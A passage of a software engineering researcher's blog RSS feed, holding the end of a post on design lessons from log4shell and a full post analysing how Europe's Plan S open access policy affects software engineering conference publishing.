+<p>As a software architect your key role is not to <em>react</em> to an event like log4shell. Instead, it is to <em>design</em> a system that minimizes the likelihood and impact such an event would have on confidentiality, integrity and availability of that system.</p>
+<p>This requires investments in:</p>
+<ul>
+<li>Maintainability: Enforcing dependency hygiene, keeping dependencies current at all times, to minimize mean time to repair and maximize availability</li>
+<li>Deployment security: Isolating components where possible and logging access, to safeguard confidentiality and integrity;</li>
+<li>Upgradability: Ensure that those who have installed <em>your</em> system or who use your library can seamlessly upgrade to (security) patches;</li>
+<li>The open source eco-system: sponsoring the development of open source components you depend on, and contributing to their security practices.</li>
+</ul>
+<p>To make this happen, you must guide the work of multiple people, including developers, customer care, operations engineers, and the security officer, and secure sufficient resources (including  time and money) for them. Most importantly, this requires that as an architect you must be an effective communicator at multiple levels, from developer to CEO, from <a href="https://architectelevator.com/">engine room to penthouse</a>.</p>
+</div>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter"><a href="https://xkcd.com/2347/"><img src="https://imgs.xkcd.com/comics/dependency.png" alt="" /></a><figcaption>XKCD: <a href="https://xkcd.com/2347/">Dependencies</a></figcaption></figure></div>
+
+
+
+<p></p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://avandeursen.com/2021/12/14/log4shell-lessons-learned-for-software-architects/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">1428</post-id>
+		<media:thumbnail url="https://avandeursen.com/wp-content/uploads/2021/12/dependency.png" />
+		<media:content url="https://avandeursen.com/wp-content/uploads/2021/12/dependency.png" medium="image">
+			<media:title type="html">dependency</media:title>
+		</media:content>
+
+		<media:content url="https://2.gravatar.com/avatar/ef31012d0a49cad89443a15b6cbec6a9a27c1e8f5ebfa8c1b47ecf83f83fc3aa?s=96&#38;d=identicon&#38;r=G" medium="image">
+			<media:title type="html">avandeursen</media:title>
+		</media:content>
+
+		<media:content url="https://imgs.xkcd.com/comics/dependency.png" medium="image" />
+	</item>
+		<item>
+		<title>Europe&#8217;s Open Access &#8220;Plan S&#8221; and Paper Publishing in Software Engineering Research</title>
+		<link>https://avandeursen.com/2019/08/20/europes-open-access-plan-s-and-paper-publishing-in-software-engineering-research/</link>
+					<comments>https://avandeursen.com/2019/08/20/europes-open-access-plan-s-and-paper-publishing-in-software-engineering-research/#comments</comments>
+		
+		<dc:creator><![CDATA[Arie van Deursen]]></dc:creator>
+		<pubDate>Tue, 20 Aug 2019 15:48:00 +0000</pubDate>
+				<category><![CDATA[Society]]></category>
+		<category><![CDATA[ACM]]></category>
+		<category><![CDATA[golden open access]]></category>
+		<category><![CDATA[open-access]]></category>
+		<category><![CDATA[Plan S]]></category>
+		<category><![CDATA[scholarly-publishing]]></category>
+		<guid isPermaLink="false">http://avandeursen.com/?p=1386</guid>
+
+					<description><![CDATA[A year ago, more than a dozen influential research funders in Europe launched Plan S. This plan poses, from 2021 onwards, strict requirements on open access publishing of any research funded through the Plan S coalition. To understand what this means for my field of research, software engineering, I did some data collection. My data [&#8230;]]]></description>
+										<content:encoded><![CDATA[<p><em>A year ago, more than a dozen influential research funders in Europe launched <a href="https://www.coalition-s.org/">Plan S</a>. This plan poses, from 2021 onwards, strict requirements on open access publishing of any research funded through the Plan S coalition. To understand what this means for my field of research, software engineering, I did some data collection. My data suggests that 14% (one out of seven) of the published papers are affected, meaning that conferences may lose 14% of their papers, unless publishers take action.</em></p>
+<h2>Plan S in a Nutshell</h2>
+<p>Plan S is an initiative launched by:</p>
+<ul>
+<li>The European Union, which runs the <a href="https://ec.europa.eu/info/horizon-europe-next-research-and-innovation-framework-programme_en">Horizon Europe</a> program of €100 billion (over 113 billion US dollars). It is the successor to H2020, and includes funding for the prestigious personal grants of the European Research Council (ERC).</li>
+<li>Twelve national research funding organizations, from various European countries, such as <a href="https://www.nwo.nl/en/policies/open+science/plan+s">The Netherlands</a> (where I live), the United Kingdom, and Austria.</li>
+</ul>
+<p>The <a href="https://www.coalition-s.org/principles-and-implementation/">aim</a> of these Plan S “funders” (collectively called “Coalition S”), is that</p>
+<blockquote><p>
+  <em>With effect from 2021, all scholarly publications on the results from research funded by public or private grants provided by national, regional and international research councils and funding bodies, must be published in Open Access Journals, on Open Access Platforms, or made immediately available through Open Access Repositories without embargo.</em>
+</p></blockquote>
+<p>The coalition has taken an axiomatic approach to expressing its plans, starting with 10 <em><a href="https://www.coalition-s.org/principles-and-implementation/">principles</a></em>, followed by a <em><a href="https://www.coalition-s.org/principles-and-implementation/">Guidance to the Implementation</a></em>. The results is a somewhat hard to understand document, in which there are <a href="https://101innovations.wordpress.com/2019/06/15/nine-routes-towards-plan-s-compliance-updated/">multiple ways</a> to become Plan S compliant.</p>
+<p>In all forms of Plan S compliance the <a href="https://creativecommons.org/licenses/by/4.0/">Creative Commons</a> license plays a key role. As Plan S (under the header <strong>Rights and Licensing</strong>) <a href="https://www.coalition-s.org/principles-and-implementation/">puts it</a>:</p>
+<blockquote><p>
+  <em>The public must be granted a worldwide, royalty-free, non-exclusive, irrevocable license to share (i.e., copy and redistribute the material in any medium or format) and adapt (i.e., remix, transform, and build upon the material) the article for any purpose, including commercial, provided proper attribution is given to the author.</em>
+</p></blockquote>
+<p>This, thus, corresponds to the <a href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution</a> license, also known as CC BY. Note that this is a very <em>generous</em> license, essentially allowing anyone to do anything with the paper. Traditionally, publishers do not like this, as they wish to keep exclusive control over who distributes the paper.</p>
+<p>Strictly speaking, Plan S does not require CC BY per se, but authors need to ask permission for any other license. For the CC BY-SA &#8220;Share-Alike&#8221; variant of the license permission will be granted automatically, but for CC BY-ND &#8220;No Derivatives&#8221; permission needs to be asked. Coalition S explicitly indicates that CC BY-NC &#8220;Non-Commercial&#8221; is <a href="https://www.coalition-s.org/rationale-for-the-revisions/">not allowed</a>:</p>
+<blockquote><p>
+  <em>We will not accept a Non-Commercial restriction on the re-use of research results.</em>
+</p></blockquote>
+<p>Given this CC BY starting point, Plan S distinguishes <a href="https://www.coalition-s.org/principles-and-implementation/">three routes</a> to compliance:</p>
+<ol>
+<li><strong>Open access venues</strong>: The conference or journal is gold open access, meaning all papers in it are freely available. This is &#8220;the ideal&#8221; case, from Plan S perspective, and compliant. Open access fees (&#8220;Article Processing Charges&#8221;) are common in this route, and will be refunded by Coalition S.</li>
+<li><strong>Subscription-based venues</strong>: These by themselves are non-compliant, but can be made compliant if the author immediately (no embargo) deposits the Author&#8217;s Accepted Manuscript (AAM) in a compliant repository <em>with a CC BY license</em>. This license is a complicating factor, since many publishers <a href="https://avandeursen.com/2016/11/06/green-open-access-faq/#venues">pose restrictions on redistribution of self-archived papers</a> (they are <em>self</em>-archived, and no one else can do this &#8212; which is at odds with the sharing principle of CC BY). If such restrictions exist, a way out can exist if the venue permits <em>hybrid open access</em>, in which authors can pay an extra fee to make their own article open access available with a CC BY license. This model is offered by many publishers, but not by all. Note, however, that in Plan S, while this route is &#8220;compliant&#8221;, Plan S <em>does not refund the APC fees</em>.</li>
+<li><strong>Subscrition venues in transition:</strong> If the conference or journal is not open access yet, but <em>in transition</em> towards a full open access model by 2024, the publisher and Plan S can agree on &#8220;transformative arrangements&#8221;. In this case the paper will be compliant, and if there are fees involved they will (likely) be covered.</li>
+</ol>
+<p>The 10 principles also address other issues relevant to open access: it requires that &#8220;the structure of fees must be transparent&#8221; (<a href="https://www.coalition-s.org/principles-and-implementation/">principle 05</a>, suggesting that some of the current article processing charges are unexplainably high), and warns that <em>the funders will monitor compliance and sanction non-compliant beneficiaries/grantees</em> (<a href="https://www.coalition-s.org/principles-and-implementation/">principle 09</a>, a direct threat to me).</p>
+<p>Plan S should start in 2021, although publishers can earn some extra time by participating in the above-mentioned &#8220;transformative arrangements&#8221;.</p>
+<h2>Plan S Compliance in Software Engineering Research</h2>
+<p>To understand whether Plan S compliant publishing in my area of research, software engineering, is possible at the moment, I looked at the top 20 venues in the area of <a href="https://scholar.google.com/citations?view_op=top_venues&amp;hl=en&amp;vq=eng_softwaresystems">Software Systems</a>, according to <a href="https://scholar.google.com/citations?view_op=top_venues&amp;hl=en&amp;vq=eng_softwaresystems">Google Metrics</a>.</p>
+<p>In these top 20 venues, just three are <em>gold</em> open access: <a href="https://www.sigplan.org/Conferences/POPL/">POPL</a> and <a href="https://www.sigplan.org/Conferences/OOPSLA/">OOPSLA</a>, both published by ACM <a href="https://pacmpl.acm.org/">SIGPLAN</a>, and <a href="https://www.etaps.org">ETAPS</a> TACAS, published by Springer. It is in these venues that authors funded through Coalition S, can safely publish, following the gold open access route to compliance. Their open access fees will be covered by the Coalition S funders.</p>
+<p>The remaining 17 are closed access subscription venues, published by ACM, IEEE, Elsevier and Springer. Authors who wish to publish there, and who need to be compliant with Plan S, would then have to resort to the self-archiving route.</p>
+<p>Since the <a href="https://avandeursen.com/2016/11/06/green-open-access-faq/#venues">self-archiving constraints of these four publishers</a> do not permit the use of CC BY without a fee, the <em>hybrid</em> route applies, in which (1) authors pay a fee; (2) the publisher distributes with CC BY; and (3) the author shares on a Plan S compliant repository. Note that this route is compliant, but that the fee is <em>not</em> refunded by Coalition S.</p>
+<p>This self-archiving route works for IEEE journals, but <em>not</em> for IEEE conferences. This is because for IEEE conferences presently authors do not have the option to pay a fee to publish just their own paper open access (unlike ACM). As stated by IEEE in their <a href="https://www.ieee.org/content/dam/ieee-org/ieee/web/org/pubs/author_version_faq.pdf">FAQ</a> on the &#8220;IEEE Policy Regarding Authors Rights to Post Accepted Versions of Their Articles&#8221;:</p>
+<blockquote><p>
+  <em>Currently IEEE does not have an Open Access program for conference articles.</em>
+</p></blockquote>
+<p>In other words: <em>Conferences published by IEEE are not Plan S compliant, not even with the green open access route (as IEEE does not permit CC BY)</em>.</p>
+<p>Of the 20 venues, IEEE is the sole publisher of two conferences (ICSME and SANER), one magazine (IEEE Software), and the co-publisher of another three (ICSE, SANER, MSR) which are published alternatingly by IEEE or ACM.</p>
+<p>In summary, of the 20 top venues:</p>
+<ul>
+<li>Three are compliant through gold open access.</li>
+<li>Eleven are compliant through a fee-based hybrid model with CC BY.</li>
+<li>Three are half of the time compliant through a fee-based hybrid model with CC BY, the other half non-compliant.</li>
+<li>Three can presently not be made compliant.</li>
+</ul>
+<p>Note that other fields may fare better: top conferences in security (<a href="https://www.usenix.org/publications/proceedings">Usenix</a>), AI (<a href="https://aaai.org/Library/conferences-library.php">AAAI</a>, <a href="https://papers.nips.cc">NIPS</a>), or <a href="https://www.sigplan.org/Conferences/OOPSLA/">OOPSLA</a>/<a href="https://www.sigplan.org/Conferences/POPL/">POPL</a>/<a href="https://www.sigplan.org/Conferences/ICFP/">ICFP</a> sponsored by <a href="https://www.sigplan.org/">SIGPLAN</a> are all full gold open access. This, however, seems the exception rather than the rule.</p>
+<h2>Plan S Rationale</h2>
+<p>With Plan S requiring many publishers to change their policies, one may wonder what the rationale behind this plan is. The way I see it, the key reason for the European funders to propose this plan is <em>leverage</em>, in the following ways:</p>
+<ul>
+<li>The European Union as a whole will benefit more from their €100 billion investment, if any (European) citizen can freely access the resulting knowledge;</li>
+<li>Research is never conducted in isolation. Progress in research is not just visible in papers <em>directly</em> funded through a project, but also in subsequent papers building <em>on top of</em> those results (refuting, strengthening, criticizing, or expanding them). The more venues are open access, the higher the chance that these follow up results are also published as open access.</li>
+<li>The universities in the European Union together will benefit financially if the publishing market shifts towards open access: The current profit margins of up to 40% of publishing giants like Elsevier are a waste of tax payer money that instead should be directly invested in research and education, the exact same causes that the EU and its Horizon Europe program seeks to advance as well. Pumping €100 billion into a system that wastes money at scale is ineffective.</li>
+</ul>
+<p>Furthermore, note that this coalition works in <em>all</em> areas of research, including climate change, health care, and artificial intelligence. From the European perspective, the world needs informed societal debate about these topics. To that end, the EU is committed to maximizing the free availability of any research it is funding.</p>
+<p>Last but not least, Coalition S is working hard to expand the list of funders, talking to both China and <a href="https://www.researchresearch.com/news/article/?articleId=1379797">India</a>, for example. Also, Jordania and Zambia have already joined, as well as the Bill and Melinda Gates Foundation (though their presence in computer science research is limited, compared to, e.g., China).</p>
+<h2>Impact on Software Engineering Conferences</h2>
+<p>With software engineering venues so clearly affected by Plan S, the next question is <em>how many papers</em> will be affected. Thus, I decided to collect some data, to measure the impact of Plan S in my field.</p>
+<p>Since conferences (with full length rigorously reviewed papers) are dominant in software engineering, I focused on these. I picked two editions of <a href="http://www.icse-conferences.org/">ICSE</a> and <a href="https://www.esec-fse.org/">ESEC/FSE</a> (for which I am a member of the steering committee) and for the smaller and more specialized <a href="https://conf.researchr.org/series/issta">ISSTA</a> conference (which I happened to attend this summer).</p>
+<p>For each published paper, I manually checked the acknowledgments to see whether the authors were beneficiaries from any of the Plan S funders. I did this for the main (technical research) track papers only, and not for, e.g., demonstration sub-tracks.</p>
+<p>The results (also available as <a href="https://docs.google.com/spreadsheets/d/1_TwYOBAzmRhrVt3ILpRUX1CnastlMvaDKWCUeweDeG0/edit?usp=sharing">spreadsheet</a>) are as follows:</p>
+<p><a href="https://docs.google.com/spreadsheets/d/1_TwYOBAzmRhrVt3ILpRUX1CnastlMvaDKWCUeweDeG0/edit?usp=sharing"><img loading="lazy" data-attachment-id="1396" data-permalink="https://avandeursen.com/2019/08/20/europes-open-access-plan-s-and-paper-publishing-in-software-engineering-research/se-conf/#main" data-orig-file="https://avandeursen.com/wp-content/uploads/2019/08/se-conf.png" data-orig-size="1664,998" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="" data-image-description="" data-image-caption="" data-medium-file="https://avandeursen.com/wp-content/uploads/2019/08/se-conf.png?w=300" data-large-file="https://avandeursen.com/wp-content/uploads/2019/08/se-conf.png?w=640" src="https://avandeursen.com/wp-content/uploads/2019/08/se-conf.png?w=640" alt="Table with data per conference" width="640" height="384" class="aligncenter size-large wp-image-1396" srcset="https://avandeursen.com/wp-content/uploads/2019/08/se-conf.png?w=640 640w, https://avandeursen.com/wp-content/uploads/2019/08/se-conf.png?w=1280 1280w, https://avandeursen.com/wp-content/uploads/2019/08/se-conf.png?w=150 150w, https://avandeursen.com/wp-content/uploads/2019/08/se-conf.png?w=300 300w, https://avandeursen.com/wp-content/uploads/2019/08/se-conf.png?w=768 768w, https://avandeursen.com/wp-content/uploads/2019/08/se-conf.png?w=1024 1024w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
+<p>A few results stand out:</p>
+<ol>
+<li>Overall, 14% (1 in 7) of the papers currently receive grants from Coalition S.</li>
+<li>The two big conferences, ICSE (over 1000 participants) and ESEC/FSE (over 300 participants), exhibit an impact on around 11-12% of the papers.</li>
+<li>For the smaller ISSTA conference, more than 25% of the papers are (co-)funded through Coalition S. This number reflects the composition of the community, and the impact is enlarged by the small total number of papers. Should the affected researchers decide <em>not</em> to submit to ISSTA anymore, this may constitute an existential threat to the conference.</li>
+<li>The EU is by far the biggest funder, with researchers and industry from many countries benefiting from participation in large EU projects. Furthermore, the EU ERC (Advanced) Grants are extremely prestigious (€2.5 million) and have been won by leaders in the software engineering field such as (in the collected data) Carlo Ghezzi, Mark Harman, Bashar Nuseibeh, and Andreas Zeller.</li>
+<li>The UK is the second biggest funder, mostly through its EPSRC program. This is the UK&#8217;s <em>national</em> program, unrelated to the European Union. Thus, EPSRC&#8217;s participation in Coalition S will not be affected by Brexit (apart from increased financial pressure on ESPRC&#8217;s overall budget as the UK&#8217;s economy is shrinking).</li>
+<li>While a small country with limited funds, Luxembourg is very active in the area of software engineering, causing high impact for, e.g., the ISSTA conference.</li>
+</ol>
+<p>The 14% I found is substantially higher than the estimate of 6% impact found by Clarivate Analytics (cited by the <a href="https://www.acm.org/articles/pubs-newsletter/2019/blue-diamond-july-2019#2">ACM</a>), and the <a href="https://www.acm.org/articles/pubs-newsletter/2019/blue-diamond-july-2019#2">5% found by the ACM</a> itself. If anything, this factor 3 or even factor 5 with ISSTA difference calls for a detailed assessment for each venue affected.</p>
+<p>My data is based on what I saw in the acknowledgments: In reality it is likely that <em>more</em> papers are affected. You can check your own papers in <a href="https://docs.google.com/spreadsheets/d/1_TwYOBAzmRhrVt3ILpRUX1CnastlMvaDKWCUeweDeG0/edit?usp=sharing">my on line spreadsheet</a> &#8212; corrections are welcome.</p>
+<p>Collecting the data takes took me around a minute per paper. You are cordially invited to repeat this exercise for your own favorite conference or journal (TSE, EMSE, JSS, MSR, ICSME, RE, MODELS, &#8230;), and I will do my best to reflect your data in this post. If you&#8217;re a conference organizer, the safest thing to do is survey authors about their funding, enquiring about Coalition S based funding explicitly.</p>
+<p>There is a another point to be made that required little data gathering.</p>
+<p>The 14% figure relates to impact on the <em>conference</em>. Individual <em>researchers</em> can be affected much more. Our <a href="https://se.ewi.tudelft.nl/">group at TU Delft</a>, for example, has been very successful in attracting substantial funding both from the EU and from the Dutch NWO. As a consequence, for me personally, half of my publications will be affected. For some new PhD students starting in my group funded on such projects <em>all</em> publications will be affected.</p>
+<h2>A Call for Action</h2>
+<p>Clearly, the impact of Plan S can be substantial, on individual researchers as well as on conferences and journals.</p>
+<p>This calls for action.</p>
+<p>ACM, as one of the leading publishers in computer science, shared an update on their Plan S progress in their <a href="https://www.acm.org/articles/pubs-newsletter/2019/blue-diamond-july-2019#2">July 2019 news letter</a>. It states:</p>
+<blockquote><p>
+  <em>It is worth noting that ACM has been working with various consortia in the US, Europe, and elsewhere on a framework for transitioning the traditional ACM Digital Library licensing (subscription) model to a Gold Open Access model utilizing an innovative &#8220;transformative agreement&#8221; model. More details will be announced later in 2019 as the first of these Agreements are executed; once these are in place, all ACM Publications will comply with the majority of Plan S requirements.</em>
+</p></blockquote>
+<p>This is good news, and certainly not a simple undertaking. I sincerely hope that ACM will be able to meet not just the majority, but <em>all</em> requirements, and for all conferences and journals. This essentially implies a change of business model for the ACM Digital Library, from a subscription based to an author-(institution)-pays model. This in itself will not be easy, and is further complicated by several constraints and strong criteria imposed by Plan S, for example concerning cost transparency. The key challenge will be to convince Coalition S that these criteria are indeed met.</p>
+<p>The ACM Special Interest Group on Programming Languages, <a href="https://www.sigplan.org/">SIGPLAN</a>, meanwhile, sets an example on how to progress within the current setting. The research papers of three of its key conferences are published as part of the <a href="https://pacmpl.acm.org/">Proceedings of the ACM in Programming Languages</a>. This is a Gold Open Access journal  in which different volumes are devoted to different conferences. The POPL, OOPSLA, and ICFP conferences have adopted this model, and hence are fully open access. To quote the <a href="https://pacmpl.acm.org/editorial_message_vol1_icfp.cfm">Inaugural Editorial Message</a> by <a href="http://homepages.inf.ed.ac.uk/wadler/">Philip Wadler</a>:</p>
+<blockquote><p>
+  <em>PACMPL is a Gold Open Access journal. It will be archived in ACM’s Digital Library, but no membership or fee is required for access. Gold Open Access has been made possible by generous funding through ACM SIGPLAN, which will cover all open access costs in the event authors cannot. Authors who can cover the costs may do so by paying an Article Processing Charge (APC). PACMPL, SIGPLAN, and ACM Headquarters are committed to exploring routes to making Gold Open Access publication both affordable and sustainable.</em>
+</p></blockquote>
+<p>The ACM SIG for Software Engineering, SIGSOFT, so far has not taken action along these lines. Nevertheless, this is simple to do, especially since SIGPLAN has laid out all the ground work.</p>
+<p>Furthermore, last year, we as ACM SIGSOFT members elected <a href="http://thomas-zimmermann.com/sigsoft2018/">Tom Zimmermann</a> as our chair. In his <a href="http://thomas-zimmermann.com/sigsoft2018/">statement for the elections</a> he wrote:</p>
+<blockquote><p>
+  <em>We should make gold open access a priority for SIGSOFT</em>
+</p></blockquote>
+<p>He also provided details on how to achieve this, mostly along the lines of SIGPLAN. By electing him, we as ACM SIGSOFT members gave him the mandate to carry this out. This will not be easy to do, but calls for all support from the full software engineering research community to help the ACM SIGSOFT leadership with this important mission.</p>
+<p>The other main non-profit society publisher in software engineering is the IEEE. IEEE publishes various conferences and journals in software engineering on its own, such as ICSME, MODELS, RE and ICST. Furthermore, several major conferences are co-sponsored by IEEE and ACM together, such as <a href="http://www.icse-conferences.org/">ICSE</a> and <a href="http://ase-conferences.org/">ASE</a>.</p>
+<p>Unfortunately, I have not been able to find on line information about IEEE&#8217;s vision on Plan S, and its impact on the conference proceedings published by the IEEE. This makes it very unclear what, from 2021 onwards, the publication options are for many software engineering conferences.</p>
+<p>Nevertheless, it is my hope that IEEE will embrace Plan S, and move to open access conference proceedings, as many other society publishers have done.</p>
+<p>This, then, will open the floor to joint open access publications, for example through the new fully open access &#8220;Proceedings of the ACM in Software Engineering&#8221;.</p>
+<hr />
+<h3>Version History</h3>
+<ul>
+<li>Version 0.4, 20-08-2019. First public version.</li>
+<li>Version 0.5, 25-08-2019. Major update to reflect that self-archiving route can aslo be used to meet Plan S requirements.</li>
+<li>Version 0.6, 26-08-2019. Small updates about CC BY options.</li>
+<li>Version 0.7, 28-08-2019. Major update about repository route in combination with CC BY and hybrid open access, and transformative arrangements.</li>
+<li>Version 0.8, 30-08-2019. Add links to IEEE open access faq/</li>
+<li>Version 0.9, 04-09-2019. Small typos fixed</li>
+</ul>
+<p><strong>Note:</strong> <a href="https://en.wikipedia.org/wiki/IANAL">IANAL</a> &#8212; use this information at your own risk.</p>
+<p><strong>Acknowledgements</strong>: Thanks to Diomidis Spinellis, Simon Bains, Jeroen Bosman, Bianca Kramer, and Jeroen Sondervan for feedback on an earlier drafts on this post.</p>
+<p><strong>License</strong>: Copyright (c) Arie van Deursen, 2019. Licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY</a>.</p>
+<h3>Slide Deck</h3>
+<p><a href="https://speakerdeck.com/avandeursen/plan-s-impact-on-software-engineering-publications"><img loading="lazy" data-attachment-id="1406" data-permalink="https://avandeursen.com/2019/08/20/europes-open-access-plan-s-and-paper-publishing-in-software-engineering-research/screen-shot-2019-08-29-at-13-48-07/#main" data-orig-file="https://avandeursen.com/wp-content/uploads/2019/08/screen-shot-2019-08-29-at-13.48.07.png" data-orig-size="1036,570" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screen Shot 2019-08-29 at 13.48.07" data-image-description="" data-image-caption="" data-medium-file="https://avandeursen.com/wp-content/uploads/2019/08/screen-shot-2019-08-29-at-13.48.07.png?w=300" data-large-file="https://avandeursen.com/wp-content/uploads/2019/08/screen-shot-2019-08-29-at-13.48.07.png?w=640" src="https://avandeursen.com/wp-content/uploads/2019/08/screen-shot-2019-08-29-at-13.48.07.png?w=640" alt="Slides" width="640" height="352" class="alignleft size-large wp-image-1406" srcset="https://avandeursen.com/wp-content/uploads/2019/08/screen-shot-2019-08-29-at-13.48.07.png?w=640 640w, https://avandeursen.com/wp-content/uploads/2019/08/screen-shot-2019-08-29-at-13.48.07.png?w=150 150w, https://avandeursen.com/wp-content/uploads/2019/08/screen-shot-2019-08-29-at-13.48.07.png?w=300 300w, https://avandeursen.com/wp-content/uploads/2019/08/screen-shot-2019-08-29-at-13.48.07.png?w=768 768w, https://avandeursen.com/wp-content/uploads/2019/08/screen-shot-2019-08-29-at-13.48.07.png?w=1024 1024w, https://avandeursen.com/wp-content/uploads/2019/08/screen-shot-2019-08-29-at-13.48.07.png 1036w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://avandeursen.com/2019/08/20/europes-open-access-plan-s-and-paper-publishing-in-software-engineering-research/feed/</wfw:commentRss>
+			<slash:comments>6</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">1386</post-id>
+		<media:content url="https://2.gravatar.com/avatar/ef31012d0a49cad89443a15b6cbec6a9a27c1e8f5ebfa8c1b47ecf83f83fc3aa?s=96&#38;d=identicon&#38;r=G" medium="image">
+			<media:title type="html">avandeursen</media:title>
+		</media:content>
+
+		<media:content url="https://avandeursen.com/wp-content/uploads/2019/08/se-conf.png?w=640" medium="image">
+			<media:title type="html">Table with data per conference</media:title>
+		</media:content>
+
+		<media:content url="https://avandeursen.com/wp-content/uploads/2019/08/screen-shot-2019-08-29-at-13.48.07.png?w=640" medium="image">
+			<media:title type="html">Slides</media:title>
+		</media:content>
+	</item>
+	</channel>
+</rss>
